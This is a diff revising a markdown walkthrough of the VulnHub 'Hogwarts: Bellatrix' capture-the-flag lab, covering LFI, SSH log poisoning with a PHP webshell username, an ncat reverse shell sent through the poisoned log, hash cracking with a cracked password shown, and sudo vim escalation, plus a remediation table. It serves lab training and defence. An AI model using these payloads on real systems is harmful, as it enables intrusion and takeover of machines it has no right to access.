@@ -1,75 +1,96 @@
 # Hogwarts: Bellatrix — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.31 (host-only) |
-| **Difficulty** | Easy-Medium |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.31 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Author** | BertrandLorente9 |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/hogwarts-bellatrix,609/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/hogwarts-bellatrix-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-`nmap` → LFI in `ikilledsiriusblack.php` → SSH log poisoning → ncat reverse shell → hidden hash + wordlist → John cracks lestrange password → `sudo vim` shell escape → root
+Hogwarts: Bellatrix combines a Local File Inclusion (LFI) vulnerability with SSH log poisoning to achieve Remote Code Execution, followed by credential discovery through a hidden wordlist, and privilege escalation via `sudo vim` (GTFOBins).
 
 ## Methodology
 
-1. Network discovery and port scan
-2. LFI discovery and `/etc/passwd` read
-3. SSH log poisoning to inject PHP payload
-4. Reverse shell via poisoned auth.log
-5. Enumerate home directory for hash and wordlist
-6. Crack hash, escalate via sudo vim
+1. Host discovery with netdiscover
+2. Port scan — SSH (22) and HTTP (80)
+3. Web source analysis revealing PHP `include` vulnerability
+4. LFI confirmed via `ikilledsiriusblack.php?file=` parameter
+5. SSH log poisoning to achieve RCE
+6. Reverse shell as `www-data`
+7. Credential harvesting from hidden file
+8. Hash cracking with John the Ripper
+9. Privilege escalation via `sudo vim`
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
+### Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
+netdiscover -r 192.168.1.0/24
+```
+
+Target at **192.168.1.31**.
+
+### Port Scan
+
+```bash
 nmap -sC -sV -p- 192.168.1.31
 ```
 
-Ports open: 22 (SSH), 80 (HTTP)
+![nmap](images/01-nmap.png)
 
-![Nmap scan](images/01-nmap.png)
+| Port | Service |
+|---|---|
+| 22/tcp | OpenSSH |
+| 80/tcp | HTTP |
 
----
+## Step 2: Web Enumeration
 
-## Step 2: LFI Discovery
+Browse to `http://192.168.1.31/`. The page source contains an HTML comment hinting at a hidden path. The PHP source uses `include($_GET['file'])` — a clear LFI indicator.
 
-Browse to the web service. Page source contains a `##` comment hinting at a PHP include. Test LFI:
+Navigating to `ikilledsiriusblack.php` confirms it accepts a `file` parameter.
 
+## Step 3: Local File Inclusion
+
+```bash
+# Test LFI with /etc/passwd
+curl "http://192.168.1.31/ikilledsiriusblack.php?file=/etc/passwd"
 ```
-http://192.168.1.31/ikilledsiriusblack.php?file=/etc/passwd
+
+![LFI Test](images/02-lfi-test.png)
+
+`/etc/passwd` content returned — LFI confirmed.
+
+Also test reading the SSH auth log:
+
+```bash
+curl "http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log"
 ```
 
-`/etc/passwd` is returned — LFI confirmed. Users visible: `lestrange`, `bellatrix`.
+SSH authentication log is readable — log poisoning is possible.
 
-![LFI confirmed](images/02-lfi.png)
+## Step 4: SSH Log Poisoning
 
----
-
-## Step 3: SSH Log Poisoning
-
-Inject a PHP webshell as the SSH username — the failed login attempt is written to `/var/log/auth.log`:
+Inject a PHP webshell payload as the SSH username. The invalid login attempt writes the payload to `/var/log/auth.log`:
 
 ```bash
 ssh '<?php system($_GET["c"]); ?>'@192.168.1.31
+# Enter any password (login will fail — that is expected)
 ```
 
-Verify the log now contains the payload:
+![Log Poisoning](images/03-log-poison.png)
 
+Verify code execution via the LFI:
+
+```bash
+curl "http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log&c=id"
+# Expected: uid=33(www-data)
 ```
-http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log&c=id
-# Output: uid=33(www-data)
-```
 
-![Log poisoning](images/03-log-poison.png)
-
----
-
-## Step 4: Reverse Shell
+## Step 5: Reverse Shell
 
 Start a listener:
 
@@ -77,62 +98,88 @@ Start a listener:
 nc -lvp 1234
 ```
 
-Trigger the reverse shell via the poisoned log:
-
-```
-http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log&c=ncat+-e+/bin/bash+192.168.1.2+1234
-```
-
-Shell received as `www-data`.
-
-![Reverse shell](images/04-shell.png)
-
----
-
-## Step 5: Enumerate, Crack, Escalate
-
-Find a base64-named directory containing a wordlist `.secret.dic` and a file `Swordofgryffindor` holding lestrange's hash:
+Trigger the reverse shell through the poisoned log:
 
 ```bash
-find /home -type f 2>/dev/null
-cat /home/<base64dir>/Swordofgryffindor    # hash
-cat /home/<base64dir>/.secret.dic          # download this wordlist
+# URL-encode the payload and send via curl or browser
+curl "http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log&c=ncat+-e+/bin/bash+192.168.1.2+1234"
 ```
 
-Transfer the wordlist and crack the hash:
+![Reverse Shell](images/04-reverse-shell.png)
+
+Shell received as `www-data`. Stabilize:
 
 ```bash
-john --wordlist=.secret.dic lestrange_hash.txt
-# lestrange:<cracked_password>
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+```
 
+## Step 6: Credential Harvesting
+
+Browse the web root and home directories recursively. A Base64-encoded directory name contains two files:
+
+```bash
+# Decode the directory name to find it
+find / -name ".secret.dic" 2>/dev/null
+find / -name "Swordofgryffindor" 2>/dev/null
+```
+
+- `.secret.dic` — a custom wordlist
+- `Swordofgryffindor` — contains a password hash for user `lestrange`
+
+Copy the hash to the attacker machine and crack it:
+
+```bash
+john --wordlist=.secret.dic lestrange.hash
+```
+
+Cracked password: **ihateharrypotter**
+
+## Step 7: Switch to lestrange
+
+```bash
 su lestrange
+# Password: ihateharrypotter
+```
+
+## Step 8: Privilege Escalation — sudo vim
+
+Check sudo permissions:
+
+```bash
 sudo -l
 # (ALL) NOPASSWD: /usr/bin/vim
 ```
 
-Escape vim to root (GTFOBins):
+Escalate to root using the GTFOBins `vim` technique:
 
 ```bash
 sudo vim -c ':!/bin/sh'
-id     # uid=0(root)
-cat /root/flag.txt
 ```
 
-![Root flag](images/05-root.png)
+A root shell is spawned.
 
----
+## Step 9: Root Flag
+
+```bash
+cd /root
+cat flag.txt
+```
+
+![Root Flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **LFI + Log Poisoning** — whenever LFI reaches `/var/log/auth.log`, SSH log poisoning converts it to RCE; test this combination systematically
-2. **SSH accepts arbitrary usernames** — the failed login is still logged including the username string verbatim
-3. **GTFOBins sudo escape** — `vim`, `less`, `more`, `nano`, `awk`, `python`, `perl` — any of these in sudoers with NOPASSWD means root
+- PHP `include` with unvalidated user input is a critical LFI vulnerability.
+- When SSH auth logs are world-readable and an LFI exists, log poisoning enables full RCE.
+- A hidden wordlist specific to the application is often the best cracking dictionary.
+- `sudo vim` without a password is trivially exploitable via GTFOBins.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| LFI in `file` parameter | Whitelist allowed files; never pass user input to `include()`/`require()` |
-| Readable `/var/log/auth.log` by www-data | Restrict log file permissions |
-| sudo vim NOPASSWD | Remove unnecessary sudo rules; prefer `sudoedit` with restricted paths |
-| Hardcoded hash + wordlist in home dir | Never store password hashes in application directories |
+| LFI via `include($_GET['file'])` | Validate and whitelist file paths; never pass raw GET params to `include` |
+| Readable SSH auth logs | Restrict `/var/log/auth.log` permissions to root only |
+| `sudo vim` NOPASSWD | Remove the sudo rule; assign minimal required privileges |
+| Weak user password | Enforce strong passwords; do not use fiction references |
